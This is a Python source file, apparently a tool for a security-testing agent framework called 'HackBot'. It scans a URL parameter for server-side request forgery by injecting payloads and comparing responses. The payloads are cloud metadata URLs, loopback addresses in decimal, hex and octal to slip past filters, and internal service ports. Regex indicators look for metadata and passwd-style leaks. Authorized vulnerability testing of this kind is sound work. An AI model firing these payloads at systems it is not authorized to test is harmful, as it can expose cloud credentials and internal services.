"""SSRF 漏洞检测工具：通过注入内网/元数据 URL 检测服务端请求伪造漏洞"""
import asyncio
import re
from typing import Any, Dict, List
from urllib.request import Request, urlopen
from urllib.parse import urlencode, urlparse, parse_qs
from urllib.error import HTTPError, URLError
from tools.base import BaseTool, ToolResult


# SSRF 测试 payload（目标 URL）
SSRF_PAYLOADS = [
    # 云元数据
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance",
    "http://100.100.100.200/latest/meta-data/",
    # 内网地址
    "http://127.0.0.1/",
    "http://localhost/",
    "http://0.0.0.0/",
    "http://[::1]/",
    "http://127.1/",
    # 绕过技巧
    "http://2130706433/",  # 127.0.0.1 的十进制
    "http://0x7f000001/",  # 127.0.0.1 的十六进制
    "http://017700000001/",  # 127.0.0.1 的八进制
    "http://127.0.0.1:22/",
    "http://127.0.0.1:3306/",
    "http://127.0.0.1:6379/",
    # DNS rebinding
    "http://spoofed.burpcollaborator.net/",
]

# 响应中的 SSRF 成功指示
SSRF_INDICATORS = [
    r"ami-id",  # AWS 元数据
    r"instance-id",
    r"meta-data",
    r"computeMetadata",
    r"SSH-\d",  # SSH banner
    r"REDIS",
    r"mysql_native_password",
    r"root:\w+:\d+",
    r"127\.0\.0\.1",
    r"localhost",
    r"\bprivate\b",
]


class SsrfDetectTool(BaseTool):
    """SSRF 漏洞检测工具"""

    sensitivity = "high"

    def __init__(self):
        super().__init__(
            name="ssrf_detect",
            description=(
                "检测目标 URL 的参数是否存在 SSRF（服务端请求伪造）漏洞。"
                "向参数注入内网地址和云元数据 URL，通过响应差异检测漏洞。"
                "参数: url(目标 URL), param(可能存在 SSRF 的参数名)"
            ),
        )

    async def execute(self, **kwargs) -> ToolResult:
        url = kwargs.get("url", "").strip()
        param = kwargs.get("param", "").strip()

        if not url:
            return ToolResult(success=False, result=None, error="缺少参数: url")
        if not param:
            return ToolResult(success=False, result=None, error="缺少参数: param（要注入的参数名）")

        loop = asyncio.get_event_loop()

        # 获取基准响应
        try:
            baseline = await loop.run_in_executor(None, lambda: self._request(url))
        except Exception as e:
            return ToolResult(success=False, result=None, error=f"无法获取基准响应: {e}")

        findings = []
        tested = 0

        for payload in SSRF_PAYLOADS:
            tested += 1
            try:
                test_url = self._inject_param(url, param, payload)
                resp = await loop.run_in_executor(None, lambda u=test_url: self._request(u))

                anomalies = self._detect_ssrf(baseline, resp)
                if anomalies:
                    findings.append({
                        "payload": payload,
                        "anomalies": anomalies,
                        "status_code": resp.get("status"),
                        "response_length": resp.get("length"),
                        "response_time": resp.get("time"),
                    })
            except Exception:
                pass

        risk_level = "critical" if findings else "low"

        return ToolResult(
            success=True,
            result={
                "url": url,
                "param": param,
                "total_tests": tested,
                "findings_count": len(findings),
                "findings": findings[:20],
                "risk_level": risk_level,
                "recommendation": (
                    "检测到可能的 SSRF 漏洞！建议：1) 过滤/白名单 URL 输入 2) 禁止访问内网 IP 3) 启用 IMDSv2"
                    if findings else "未检测到 SSRF 漏洞"
                ),
            },
        )

    def _request(self, url: str, timeout: int = 8) -> Dict:
        """发送请求并记录响应"""
        import time
        req = Request(url)
        req.add_header("User-Agent", "Mozilla/5.0 (compatible; HackBot-SSRF-Scanner/1.0)")

        start = time.time()
        try:
            with urlopen(req, timeout=timeout) as resp:
                body = resp.read().decode(errors="ignore")
                elapsed = time.time() - start
                return {
                    "status": resp.status,
                    "length": len(body),
                    "body": body[:3000],
                    "time": round(elapsed, 3),
                    "headers": dict(resp.headers),
                }
        except HTTPError as e:
            body = e.read().decode(errors="ignore") if e.fp else ""
            elapsed = time.time() - start
            return {
                "status": e.code,
                "length": len(body),
                "body": body[:3000],
                "time": round(elapsed, 3),
                "headers": dict(e.headers) if e.headers else {},
            }

    def _inject_param(self, url: str, param: str, payload: str) -> str:
        """注入 payload 到参数"""
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [payload]
        new_query = urlencode({k: v[0] for k, v in qs.items()})
        return parsed._replace(query=new_query).geturl()

    def _detect_ssrf(self, baseline: Dict, response: Dict) -> List[str]:
        """检测 SSRF 指标"""
        anomalies = []

        body = response.get("body", "")

        # 检查响应中是否包含 SSRF 成功指标
        for pattern in SSRF_INDICATORS:
            if re.search(pattern, body, re.IGNORECASE):
                anomalies.append(f"响应中匹配到 SSRF 指标: {pattern}")

        # 状态码变化
        if response["status"] != baseline["status"] and response["status"] == 200:
            anomalies.append(f"状态码变化: {baseline['status']} -> {response['status']}")

        # 响应长度显著变化
        if baseline["length"] > 0:
            diff = abs(response["length"] - baseline["length"])
            if diff > 100 and diff / baseline["length"] > 0.3:
                anomalies.append(f"响应长度显著变化: {baseline['length']} -> {response['length']}")

        # 响应时间显著变化（可能在访问内网服务）
        if response.get("time", 0) > baseline.get("time", 0) + 2:
            anomalies.append(f"响应时间显著增长: {baseline.get('time', 0)}s -> {response.get('time', 0)}s")

        return anomalies

    def get_schema(self) -> Dict[str, Any]:
        return {
            "name": self.name,
            "description": self.description,
            "sensitivity": self.sensitivity,
            "parameters": {
                "url": {"type": "string", "description": "目标 URL（含参数）", "required": True},
                "param": {"type": "string", "description": "可能存在 SSRF 的参数名", "required": True},
            },
        }
